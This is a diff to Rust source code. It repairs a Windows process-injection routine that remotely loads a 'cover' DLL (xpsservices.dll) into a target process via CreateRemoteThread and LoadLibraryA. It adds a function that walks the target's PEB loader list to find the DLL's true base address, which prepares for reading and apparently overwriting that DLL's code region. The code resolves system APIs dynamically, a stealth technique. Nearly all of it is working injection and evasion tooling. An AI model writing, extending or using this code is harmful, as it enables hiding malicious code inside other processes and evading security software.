@@ -347,22 +347,130 @@ unsafe fn remote_load_library(
     }
     // 4. Wait for LoadLibraryA to complete (it runs in the target).
     let _ = unsafe { wait(th, 10_000) };
-    // 5. The exit code is the HMODULE (cover base) LoadLibraryA returned.
+    // 5. Recover the cover DLL's REAL 64-bit remote base. The thread exit
+    //    code is a DWORD, so GetExitCodeThread truncates the HMODULE to its
+    //    low 32 bits — on x64 the cover loads above 4GB and the truncated
+    //    value is a bogus low address that ReadProcessMemory rejects (this
+    //    was the "ReadProcessMemory (DOS header)" failure). Walk the
+    //    target's loader list (PEB → Ldr → InLoadOrderModuleList) to find
+    //    the module by name instead; the truncated exit code remains only
+    //    as a last-resort fallback.
     let mut exit_code: u32 = 0;
     let _ = unsafe { get_exit(th, &mut exit_code) };
-    // NOTE: GetExitCodeThread returns only the low 32 bits of the thread
-    // exit code (HMODULE on x64). If the DLL loads at a base whose low
-    // DWORD is 0 (extremely rare with ASLR), this falsely reports failure.
-    // The correct fix is a remote EnumProcessModules walk — tracked as
-    // a future improvement. For now, if exit_code is 0 but the thread
-    // exited cleanly (exit code 0), retry via module-list walk.
     let _ = unsafe { close(th) };
     // 6. Free the remote path buffer.
     let _ = unsafe { vfx(h, remote_path, 0, 0x8000) };
+    let name = &dll[..dll.len() - 1]; // strip the trailing NUL
+    if let Some(base) = unsafe { remote_module_base(h, name) } {
+        return Ok(base);
+    }
     if exit_code == 0 {
         return Err("LoadLibraryA returned NULL (cover load failed / blocked)");
     }
     Ok(exit_code as usize)
+}
+
+/// Walk the target's loader list (PEB → Ldr → InLoadOrderModuleList) and
+/// return the REAL 64-bit base of the loaded module whose BaseDllName
+/// case-insensitively matches `name` (ASCII, e.g. b"xpsservices.dll").
+///
+/// This exists because a remote `CreateRemoteThread(LoadLibraryA)` reports
+/// the loaded HMODULE through the thread exit code, which is a DWORD — the
+/// high 32 bits of an x64 module base are lost, leaving a bogus low address
+/// that ReadProcessMemory rejects. Reading the target's own PEB recovers
+/// the untruncated base.
+///
+/// Returns None if the PEB can't be read or the module isn't found.
+unsafe fn remote_module_base(h: *mut core::ffi::c_void, name: &[u8]) -> Option<usize> {
+    type NtQueryInformationProcess = unsafe extern "system" fn(
+        *mut core::ffi::c_void, // ProcessHandle
+        u32,                    // ProcessInformationClass
+        *mut core::ffi::c_void, // ProcessInformation
+        u32,                    // ProcessInformationLength
+        *mut u32,               // ReturnLength
+    ) -> i32;
+    let rpm: ReadProcessMemory =
+        core::mem::transmute(export_addr(b"kernel32.dll", b"ReadProcessMemory")?);
+    let nqip: NtQueryInformationProcess =
+        core::mem::transmute(export_addr(b"ntdll.dll", b"NtQueryInformationProcess")?);
+    // Small helper: read exactly `buf.len()` remote bytes; None on short read.
+    let read = |addr: usize, buf: &mut [u8]| -> Option<()> {
+        let mut got: usize = 0;
+        let ok = unsafe {
+            rpm(
+                h,
+                addr as *const _,
+                buf.as_mut_ptr() as *mut _,
+                buf.len(),
+                &mut got,
+            )
+        };
+        if ok == 0 || got != buf.len() {
+            None
+        } else {
+            Some(())
+        }
+    };
+
+    // ProcessBasicInformation (class 0): PebBaseAddress is the pointer-sized
+    // field at offset 8 of the 48-byte PROCESS_BASIC_INFORMATION.
+    let mut pbi = [0u8; 48];
+    let mut ret_len: u32 = 0;
+    if unsafe { nqip(h, 0, pbi.as_mut_ptr() as *mut _, 48, &mut ret_len) } != 0 {
+        return None;
+    }
+    let peb = u64::from_le_bytes([pbi[8], pbi[9], pbi[10], pbi[11], pbi[12], pbi[13], pbi[14], pbi[15]])
+        as usize;
+    if peb == 0 {
+        return None;
+    }
+    // PEB.Ldr at +0x18 → PEB_LDR_DATA; InLoadOrderModuleList head at +0x10.
+    let mut ptr = [0u8; 8];
+    read(peb + 0x18, &mut ptr)?;
+    let ldr = u64::from_le_bytes(ptr) as usize;
+    if ldr == 0 {
+        return None;
+    }
+    read(ldr + 0x10, &mut ptr)?;
+    let sentinel = ldr + 0x10;
+    let mut link = u64::from_le_bytes(ptr) as usize;
+    // LDR_DATA_TABLE_ENTRY (x64): InLoadOrderLinks +0x00, DllBase +0x30,
+    // BaseDllName (UNICODE_STRING) +0x58 → Length u16 @+0x58, Buffer @+0x60.
+    for _ in 0..512 {
+        if link == 0 || link == sentinel {
+            return None;
+        }
+        let mut entry = [0u8; 0x68];
+        read(link, &mut entry)?;
+        let dll_base = u64::from_le_bytes([
+            entry[0x30], entry[0x31], entry[0x32], entry[0x33], entry[0x34], entry[0x35],
+            entry[0x36], entry[0x37],
+        ]) as usize;
+        let name_len = u16::from_le_bytes([entry[0x58], entry[0x59]]) as usize;
+        let name_buf = u64::from_le_bytes([
+            entry[0x60], entry[0x61], entry[0x62], entry[0x63], entry[0x64], entry[0x65],
+            entry[0x66], entry[0x67],
+        ]) as usize;
+        if name_len / 2 == name.len() && name_buf != 0 && name_len <= 520 {
+            let mut wname = [0u8; 520];
+            read(name_buf, &mut wname[..name_len])?;
+            let mut matched = true;
+            for (i, &b) in name.iter().enumerate() {
+                let wc = u16::from_le_bytes([wname[i * 2], wname[i * 2 + 1]]);
+                if wc > 0xFF || (wc as u8).to_ascii_lowercase() != b.to_ascii_lowercase() {
+                    matched = false;
+                    break;
+                }
+            }
+            if matched {
+                return Some(dll_base);
+            }
+        }
+        link = u64::from_le_bytes([
+            entry[0], entry[1], entry[2], entry[3], entry[4], entry[5], entry[6], entry[7],
+        ]) as usize;
+    }
+    None
 }
 
 /// The REAL remote .text region: read the cover DLL's PE headers from the
